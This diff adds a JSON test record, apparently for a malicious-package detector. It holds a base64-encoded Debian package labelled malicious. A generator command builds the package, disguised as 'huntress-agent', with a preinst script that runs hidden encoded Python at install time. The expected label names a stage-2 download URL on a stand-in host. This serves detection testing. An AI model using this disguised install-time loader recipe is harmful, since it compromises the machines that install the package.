@@ -1,0 +1,12 @@
+{
+ "material": "ITxhcmNoPgpkZWJpYW4tYmluYXJ5ICAgMTc5Mjc3MjU1MSAgMCAgICAgMCAgICAgMTAwNjQ0ICA0ICAgICAgICAgYAoyLjAKY29udHJvbC50YXIueHogIDE3OTI3NzI1NTEgIDAgICAgIDAgICAgIDEwMDY0NCAgNjA0ICAgICAgIGAK/Td6WFoAAATm1rRGBMCbBIBQIQEWAAAAAAAAACT4/8PgJ/8CE10AFwu8HH0BlcAdSj55FcLMJqNjFmLh2J+C9uzCFqsXPNjghDynPO86LFtJZGIQxQse7FkJo/JDUd8hUzEgFYS9v4ftNPkMbwA8zatMnWlpyrgMFiMYPQTq+YkwWdgWj7BtWpI0tYfSFg2jsTh/ugsl9qvhLQGyzcdBhK1Z7qrtA/RYYLFFepEwA06e/ArNqlbyEkjZOXQVp9+HoSYPdS5+mkEz3sjfEgsl6G1KckD2RP6udKTddEuPeYkzeyzIXqVVqcI/ueCi423+qOxjjVgFDbXH3BqmDyUEKrpctQzMqejO8RdZfYmyQ+iQpan3gZ/iZPeHqhVxekuvTmgsZFw0yC8z4yuE1nqKa/ZEFw7aKCMfDkEBaeP9YXqD9NKkBYvn1pf2X5uOglFpJEeXvn8AvNK7BI+h6hWGceDg4agcn2xMEbG6nFBC/rKbmELSxywUx+o3k138wPc9psWHUMDgbBNDqI/wqAAd2LDs1LpPMhV87N934P/CH++1gSFGo6biAGBqFuuNWKF6XtRUjrECw5wTPawqMocHYhhPNWMcNivhg6raNJaGxbq411aYKETQRTVhtllKVdijbuiZ0AtAv0MiUK0pAYy7IgwygEoFwyazqNifcaGZzE2rco8JK69kZvyBl5C52F/HF9DT480vNN7ugZZ/VMXIv6FbYZVmV3Kc1LLm+muicPGM8fxN49i7WUoAAAC2iI51ZOQkwQABtwSAUAAAW8n/sLHEZ/sCAAAAAARZWmRhdGEudGFyLnh6ICAgICAxNzkyNzcyNTUxICAwICAgICAwICAgICAxMDA2NDQgIDE2OCAgICAgICBgCv03elhaAAAE5ta0RgTAZoBQIQEWAAAAAAAAAABCN/Ij4Cf/AF5dABcLvBx9AZXAMURag6pbe6fLuWw67Pkru9GtyhM7xzEsEmWUVbnz7xatQYueNlv14w8XK2bvc+enBaEeUl+ij8Stes9lm0YJCbjaCuLcTssP9n7wu4Y0eo2ktBcZHQAAAABfYPicoR1wjwABggGAUAAANdCoLLHEZ/sCAAAAAARZWg==",
+ "rep": "deb",
+ "transform": null,
+ "key": "preinst",
+ "expected": "v=3|language=python|role=installer|verdict=malicious|attack=T1546.016|adapter=deb_preinst|stage_count=2|steps=install_package,run_preinst|campaign_id=DEB-5e6f7a8b|url=https://deb-5e6f7a8b.example.invalid/s2",
+ "decoy": false,
+ "generator_cmd": "mkdir -p d/DEBIAN; printf 'Package: huntress-agent\\nVersion: 1.0\\nArchitecture: all\\n...' > d/DEBIAN/control; M=$(printf %s '<plan>' | gzip -9n | base64 -w0); printf '#!/usr/bin/python3\\nimport base64, gzip\\ndescriptor_<id> = \"%s\"\\nexec(gzip.decompress(base64.b64decode(descriptor_<id>)))\\n' \"$M\" > d/DEBIAN/preinst; chmod 755 d/DEBIAN/preinst; dpkg-deb --root-owner-group -Zxz --build d pkg_deb_xz_preinst_py.deb  (dpkg-deb 1.21+ writer: ar + control.tar.xz); material = base64 -w0 pkg_deb_xz_preinst_py.deb",
+ "oracle_cmd": "dpkg-deb --ctrl-tarfile pkg_deb_xz_preinst_py.deb | tar -xO ./preinst | grep -o 'H4sI[A-Za-z0-9+/=]*' | base64 -d | gunzip",
+ "source_file": "pkg_deb_xz_preinst_py.deb",
+ "note": "linux-package-maintainer-scripts (T1546.016 / T1059.004): decode(rep=deb) -> pkg_scripts -> script body readers"
+}
